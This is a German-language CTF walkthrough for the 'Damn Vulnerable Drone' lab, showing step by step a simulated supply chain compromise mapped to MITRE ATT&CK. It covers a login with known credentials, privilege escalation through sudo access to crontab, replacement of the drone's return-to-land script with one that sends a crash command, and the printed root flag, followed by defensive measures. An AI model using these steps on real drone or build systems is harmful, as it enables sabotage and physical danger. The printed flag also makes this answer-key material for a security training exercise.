# Damn Vulnerable Drone - Supply Chain Compromise CTF

## Überblick

Willkommen zur **Damn Vulnerable Drone** CTF-Challenge! In diesem Szenario simulieren wir einen realistischen Supply Chain Compromise, der verschiedene Phasen des MITRE ATT&CK Frameworks abbildet.

### Scenario
Sie sind ein Penetrationstester, der eine Sicherheitsbewertung eines Drohnen-Entwicklungssystems durchführt. Das Ziel ist es, eine Supply Chain Compromise durchzuführen, die letztendlich zum Absturz der Drohne führt und dabei die Root-Flag zu extrahieren.

---

## Phase 1: Initial Access (MITRE: T1078 - Valid Accounts)

### Schritt 1: Verbindung zur Developer-Maschine

Zunächst müssen Sie sich mit dem bereitgestellten Developer-Account verbinden:

```bash
# Verbindung zum Container
docker exec -it ground-control-station /bin/bash

# Oder direkt als developer user
docker exec -it -u developer ground-control-station /bin/bash
```

**Credentials:**
- Username: `developer`
- Password: `dev123`

### Was Sie jetzt haben:
- ✅ Zugriff auf ein niedrig privilegiertes Developer-Konto
- ✅ Grundlegende Systemzugriffe
- ❌ Noch keine Root-Privilegien

---

## Phase 2: Discovery (MITRE: T1083 - File and Directory Discovery)

### Schritt 2: Systemerkundung

Erkunden Sie das System und suchen Sie nach Hinweisen:

```bash
# Überprüfen Sie Ihr Home-Verzeichnis
ls -la /home/developer/
cd /home/developer/Documents/
cat README.txt
cat known_issues.txt
```

### Was Sie finden werden:
Die Dateien geben Ihnen wichtige Hinweise:
- Das Build-System führt periodische Updates durch
- Es gibt geplante Tasks
- Überprüfen Sie das `/opt/` Verzeichnis für Build-Skripte

### Schritt 3: Weitere Erkundung

```bash
# Überprüfen Sie das /opt/ Verzeichnis
ls -la /opt/
cat /opt/build-update.sh

# Überprüfen Sie die aktuelle RTL-Datei
cat /return-to-land.py

# Überprüfen Sie sudo-Berechtigungen
sudo -l
```

### Wichtige Erkenntnisse:
- 🔍 Der developer kann `crontab` ohne Passwort ausführen
- 🔍 Es gibt ein Build-Update-Skript in `/opt/`
- 🔍 Die `return-to-land.py` ist derzeit legitim

---

## Phase 3: Privilege Escalation (MITRE: T1053.003 - Cron)

### Schritt 4: Cron-basierte Privilege Escalation

Da der developer sudo-Zugriff auf `crontab` hat, können Sie einen Cron-Job als root erstellen:

```bash
# Erstellen Sie einen Cron-Job, der das Build-Update-Skript ausführt
sudo crontab -e

# Fügen Sie folgende Zeile hinzu (führt alle 2 Minuten aus):
*/2 * * * * /opt/build-update.sh

# Speichern und beenden
# Überprüfen Sie den Cron-Job
sudo crontab -l
```

### Was passiert jetzt:
- ⏰ Alle 2 Minuten wird das Build-Update-Skript als root ausgeführt
- 🔄 Das Skript ersetzt die legitime RTL-Datei mit einer bösartigen Version

---

## Phase 4: Supply Chain Compromise (MITRE: T1195.002 - Software Supply Chain)

### Schritt 5: Warten auf die Kompromittierung

Überwachen Sie den Prozess:

```bash
# Überwachen Sie die RTL-Datei auf Änderungen
watch -n 10 "ls -la /return-to-land.py && echo '---' && head -10 /return-to-land.py"

# Oder überprüfen Sie den Systemlog
tail -f /var/log/syslog | grep CRON
```

### Schritt 6: Verifikation der Kompromittierung

Nach maximal 2 Minuten sollte sich die RTL-Datei ändern:

```bash
# Überprüfen Sie den Inhalt der kompromittierten Datei
cat /return-to-land.py
```

### Was Sie sehen werden:
Die ursprüngliche `return_to_launch` Funktion wurde durch eine `send_flight_termination_command` Funktion ersetzt, die:
- 💥 Einen Flugabbruchbefehl an die Drohne sendet
- 🏴 Die Root-Flag anzeigt, wenn die Drohne abstürzt

---

## Phase 5: Impact (MITRE: T1485 - Data Destruction)

### Schritt 7: Drohnen-Simulation und Flag-Extraktion

Starten Sie die kompromittierte RTL-Datei:

```bash
# Führen Sie die kompromittierte RTL-Datei aus
python3 /return-to-land.py
```

### Erwartete Ausgabe:
```
Connected to drone
CRITICAL: Flight termination command sent - simulating crash

[DRONE CRASHED] Root Flag: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}
```

---

## MITRE ATT&CK Mapping

Diese Challenge demonstriert folgende Techniken:

| Phase | MITRE ID | Technik | Implementierung |
|-------|----------|---------|-----------------|
| Initial Access | T1078 | Valid Accounts | Developer-Account mit schwachem Passwort |
| Discovery | T1083 | File and Directory Discovery | Systemerkundung und Dateisuche |
| Privilege Escalation | T1053.003 | Scheduled Task/Job: Cron | Sudo-Zugriff auf crontab |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | Wiederkehrender Cron-Job |
| Supply Chain Compromise | T1195.002 | Compromise Software Supply Chain | Manipulation der RTL-Komponente |
| Impact | T1485 | Data Destruction | Drohnenabsturz-Simulation |

---

## Lernziele

Nach Abschluss dieser Challenge verstehen Sie:

1. **Supply Chain Vulnerabilities**: Wie Angreifer Entwicklungsumgebungen kompromittieren können
2. **Privilege Escalation**: Ausnutzung von sudo-Berechtigungen für Cron-Jobs
3. **Persistent Access**: Verwendung von Cron-Jobs für dauerhafte Kompromittierung
4. **Impact Assessment**: Realistische Auswirkungen von Supply Chain Attacks

---

## Defensive Maßnahmen

### Empfohlene Schutzmaßnahmen:

1. **Principle of Least Privilege**: Minimale sudo-Berechtigungen für Entwickler
2. **Code Integrity**: Überwachung kritischer Systemdateien
3. **Supply Chain Security**: Verifikation und Signierung von Build-Artefakten
4. **Monitoring**: Überwachung von Cron-Job-Änderungen
5. **Access Controls**: Strikte Kontrolle über Build-Systeme

### Zusätzliche Sicherheitskontrollen:
```bash
# File Integrity Monitoring
sudo apt-get install aide
sudo aide --init

# Cron Job Monitoring
sudo auditctl -w /etc/crontab -p wa -k cron_changes

# Process Monitoring
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Troubleshooting

### Problem: Cron-Job läuft nicht
```bash
# Überprüfen Sie den Cron-Service
sudo service cron status
sudo service cron start

# Überprüfen Sie die Logs
sudo tail -f /var/log/syslog
```

### Problem: RTL-Datei ändert sich nicht
```bash
# Überprüfen Sie die Berechtigungen
ls -la /opt/build-update.sh
sudo chmod +x /opt/build-update.sh

# Manueller Test des Skripts
sudo /opt/build-update.sh
```

### Problem: Keine Verbindung zur Drohne
```bash
# Dies ist normal in der Simulation - die Ausgabe zeigt trotzdem die Flag
# Die MAVLink-Verbindung ist für die Flag-Extraktion nicht erforderlich
```

---

## Fazit

Diese Challenge demonstriert einen realistischen Supply Chain Compromise, der zeigt, wie Angreifer:
- Niedrig privilegierte Konten ausnutzen
- Entwicklungsumgebungen kompromittieren  
- Kritische Infrastruktur beeinträchtigen

Die gelernten Techniken sind direkt auf reale Umgebungen anwendbar und zeigen die Wichtigkeit von robusten Sicherheitskontrollen in Entwicklungsumgebungen.

**Flag:** `DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}`